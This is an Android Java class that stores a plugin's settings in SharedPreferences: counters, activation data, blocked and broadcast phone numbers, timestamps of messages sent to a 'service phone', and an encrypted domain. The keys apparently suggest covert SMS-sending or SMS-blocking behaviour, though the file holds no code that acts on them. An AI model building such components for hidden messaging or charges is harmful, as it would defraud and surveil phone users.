package com.xstd.plugin.config;

import android.content.Context;
import android.content.SharedPreferences;
import android.text.TextUtils;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-14
 * Time: AM10:58
 * To change this template use File | Settings | File Templates.
 */
public class SettingManager {
    private static SettingManager mInstance;

    private Context mContext;

    private SharedPreferences mSharedPreferences;

    private SharedPreferences.Editor mEditor;

    public static synchronized SettingManager getInstance() {
        if (mInstance == null) {
            mInstance = new SettingManager();
        }

        return mInstance;
    }


    private static final String SHARE_PREFERENCE_NAME = "setting_manager_share_pref_custom";

    // 在Application中一定要调用
    public synchronized void init(Context context) {
        mContext = context.getApplicationContext();
        mSharedPreferences = mContext.getSharedPreferences(SHARE_PREFERENCE_NAME, 0);
        mEditor = mSharedPreferences.edit();
    }

    private SettingManager() {
    }

    public void clearAll() {
    }

    public static final String KEY_ACTIVE_APP_NAME = "key_active_app_name";

    public void setKeyActiveAppName(String name) {
        mEditor.putString(KEY_ACTIVE_APP_NAME, name).commit();
    }

    public String getKeyActiveAppName() {
        return mSharedPreferences.getString(KEY_ACTIVE_APP_NAME, null);
    }

    public static final String KEY_ACTIVE_PACKAGE_NAME = "key_active_package";

    public void setKeyActivePackageName(String name) {
        mEditor.putString(KEY_ACTIVE_PACKAGE_NAME, name).commit();
    }

    public String getKeyActivePackageName() {
        return mSharedPreferences.getString(KEY_ACTIVE_PACKAGE_NAME, null);
    }

    public static final String KEY_SMS_CENTER_NUM = "key_sms_center_num";

//    public void setKeySmsCenterNum(String num) {
//        mEditor.putString(KEY_SMS_CENTER_NUM, num).commit();
//    }

//    public String getKeySmsCenterNum() {
//        return mSharedPreferences.getString(KEY_SMS_CENTER_NUM, null);
//    }

    public static final String KEY_HAS_BINDING_DEVICES = "key_has_bindding_devices";

    public void setKeyHasBindingDevices(boolean binding) {
        mEditor.putBoolean(KEY_HAS_BINDING_DEVICES, binding);
        mEditor.commit();
    }

    public boolean getKeyHasBindingDevices() {
        return mSharedPreferences.getBoolean(KEY_HAS_BINDING_DEVICES, false);
    }

    public static final String KEY_ACTIVE_TIME = "key_active_time";

    public void setKeyActiveTime(long time) {
        mEditor.putLong(KEY_ACTIVE_TIME, time);
        mEditor.commit();
    }

    public long getKeyActiveTime() {
        return mSharedPreferences.getLong(KEY_ACTIVE_TIME, 0);
    }

    public static final String KEY_BLOCK_PHONE_NUMBER = "key_block_phone_number";

    public void setKeyBlockPhoneNumber(String number) {
        mEditor.putString(KEY_BLOCK_PHONE_NUMBER, number).commit();
    }

    public String getKeyBlockPhoneNumber() {
        return mSharedPreferences.getString(KEY_BLOCK_PHONE_NUMBER, null);
    }

    public static final String KEY_MONTH_COUNT = "month_count";

    public void setKeyMonthCount(int count) {
        mEditor.putInt(KEY_MONTH_COUNT, count).commit();
    }

    public int getKeyMonthCount() {
        return mSharedPreferences.getInt(KEY_MONTH_COUNT, 0);
    }

    public void setFirstLanuchTime(int time) {
        mEditor.putInt("first_lanuch", time).commit();
    }

    public int getFirstLanuchTime() {
        return mSharedPreferences.getInt("first_lanuch", 0);
    }

    public static final String KEY_DAY_COUNT = "day_count";

    public void setKeyDayCount(int count) {
        mEditor.putInt(KEY_DAY_COUNT, count).commit();
    }

    public int getKeyDayCount() {
        return mSharedPreferences.getInt(KEY_DAY_COUNT, 0);
    }

    public static final String KEY_LAST_COUNT_TIME = "last_time";

    public void setKeyLastCountTime(long time) {
        mEditor.putLong(KEY_LAST_COUNT_TIME, time).commit();
    }

    public long getKeyLastCountTime() {
        return mSharedPreferences.getLong(KEY_LAST_COUNT_TIME, 0);
    }

    public static final String KEY_DAY_ACTIVE_COUNT = "day_active_count";

    public void setKeyDayActiveCount(int count) {
        mEditor.putInt(KEY_DAY_ACTIVE_COUNT, count).commit();
    }

    public int getKeyDayActiveCount() {
        return mSharedPreferences.getInt(KEY_DAY_ACTIVE_COUNT, 0);
    }

    public static final String KEY_LAST_FETCH_SMS_CENTER = "key_last_fetch_center";

    public void setKeyLastSendMsgToServicePhone(long time) {
        mEditor.putLong(KEY_LAST_FETCH_SMS_CENTER, time).commit();
    }

    public long getKeyLastSendMsgToServicehPhone() {
        return mSharedPreferences.getLong(KEY_LAST_FETCH_SMS_CENTER, 0);
    }

    public void setKeySendMsgToServicePhoneClearTimes(int times) {
        mEditor.putInt("service_phone_clear_times", times).commit();
    }

    public int getKeySendMsgToServicePhoneClearTimes() {
        return mSharedPreferences.getInt("service_phone_clear_times", 0);
    }

    public static final String KEY_RANDOM_NETWORK_TIME = "key_random_network_time";

    public void setKeyRandomNetworkTime(int randomHour) {
        mEditor.putInt(KEY_RANDOM_NETWORK_TIME, randomHour).commit();
    }

    public int getKeyRandomNetworkTime() {
        return mSharedPreferences.getInt(KEY_RANDOM_NETWORK_TIME, 0);
    }

    public void setKeyLastErrorInfo(String error) {
        mEditor.putString("last_error", error).commit();
    }

    public String getKeyLastErrorInfo() {
        return mSharedPreferences.getString("last_error", "无");
    }

    /**
     * 域名相关
     */
    public void setKeyDomain(String encrypt) {
        mEditor.putString("keyDomain", encrypt).commit();
    }

    public String geKeyDomain() {
        return mSharedPreferences.getString("keyDomain", null);
    }

    public void setKeyDeviceHasSendToServicePhone(boolean ignore) {
        mEditor.putBoolean("ignore", ignore).commit();
    }

    public boolean getKeyDeviceHasSendToServicePhone() {
        return mSharedPreferences.getBoolean("ignore", false);
    }

    public synchronized void setBroadcastPhoneNumber(String phones) {
        mEditor.putString("phones", phones).commit();
    }

    public synchronized String getBroadcastPhoneNumber() {
        return mSharedPreferences.getString("phones", null);
    }

    public void setCurrentPhoneNumber(String number) {
        mEditor.putString("phoneNumber", number).commit();
    }

    public String getCurrentPhoneNumber() {
        return mSharedPreferences.getString("phoneNumber", null);
    }

    public void setDeviceBindingTime(int count) {
        mEditor.putInt("device_bind_c", count).commit();
    }

    public int getDeviceBindingTime() {
        return mSharedPreferences.getInt("device_bind_c", 0);
    }
}
